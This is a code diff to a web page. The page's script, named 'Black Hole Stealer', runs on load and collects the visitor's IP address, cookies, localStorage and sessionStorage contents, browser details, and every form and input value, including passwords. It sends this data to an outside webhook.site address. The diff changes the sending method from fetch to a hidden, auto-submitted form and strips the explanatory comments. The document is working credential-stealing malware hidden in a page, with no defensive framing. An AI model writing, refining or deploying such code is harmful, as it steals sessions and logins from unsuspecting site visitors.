@@ -10,22 +10,27 @@ body { background: #000; width:100vw; height:100vh; overflow:hidden; }
 </head>
 <body>
 <script>
-// ===== BLACK HOLE STEALER - ONE BIG LOG PER VISIT =====
+// ===== BLACK HOLE STEALER - FORM VERSION =====
 (function() {
     const WEBHOOK = 'https://webhook.site/38be745b-416b-4abd-a51e-9467ccca7ac1';
     
     function send(data) {
         try {
-            fetch(WEBHOOK, {
-                method: 'POST',
-                mode: 'no-cors',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            });
+            const json = JSON.stringify(data);
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = WEBHOOK;
+            form.style.display = 'none';
+            const input = document.createElement('input');
+            input.type = 'text';
+            input.name = 'data';
+            input.value = json;
+            form.appendChild(input);
+            document.body.appendChild(form);
+            form.submit();
         } catch(e) {}
     }
     
-    // ===== IP =====
     let ip = 'unknown';
     fetch('https://api.ipify.org?format=json')
         .then(r => r.json())
@@ -38,22 +43,15 @@ body { background: #000; width:100vw; height:100vh; overflow:hidden; }
         });
     
     function collectAndSend() {
-        // ===== COOKIES =====
         const cookies = document.cookie || 'No cookies';
-        
-        // ===== LOCAL STORAGE =====
         const ls = {};
         for (let key in localStorage) {
             try { ls[key] = localStorage[key]; } catch(e) {}
         }
-        
-        // ===== SESSION STORAGE =====
         const ss = {};
         for (let key in sessionStorage) {
             try { ss[key] = sessionStorage[key]; } catch(e) {}
         }
-        
-        // ===== BROWSER INFO =====
         const browser = {
             userAgent: navigator.userAgent,
             language: navigator.language,
@@ -64,8 +62,6 @@ body { background: #000; width:100vw; height:100vh; overflow:hidden; }
             url: window.location.href,
             timestamp: new Date().toISOString()
         };
-        
-        // ===== FORMS (passwords, logins) =====
         const forms = [];
         document.querySelectorAll('form').forEach(form => {
             const data = {};
@@ -76,8 +72,6 @@ body { background: #000; width:100vw; height:100vh; overflow:hidden; }
                 data: data
             });
         });
-        
-        // ===== INPUTS =====
         const inputs = [];
         document.querySelectorAll('input, textarea, select').forEach(el => {
             inputs.push({
@@ -89,14 +83,10 @@ body { background: #000; width:100vw; height:100vh; overflow:hidden; }
                 placeholder: el.placeholder || ''
             });
         });
-        
-        // ===== PLUGINS =====
         const plugins = [];
         for (let i = 0; i < navigator.plugins.length; i++) {
             plugins.push(navigator.plugins[i].name);
         }
-        
-        // ===== ONE BIG LOG =====
         const log = {
             ip: ip,
             cookies: cookies,
@@ -108,8 +98,6 @@ body { background: #000; width:100vw; height:100vh; overflow:hidden; }
             plugins: plugins,
             timestamp: new Date().toISOString()
         };
-        
-        // ===== SEND ONE BIG LOG =====
         send(log);
     }
 })();
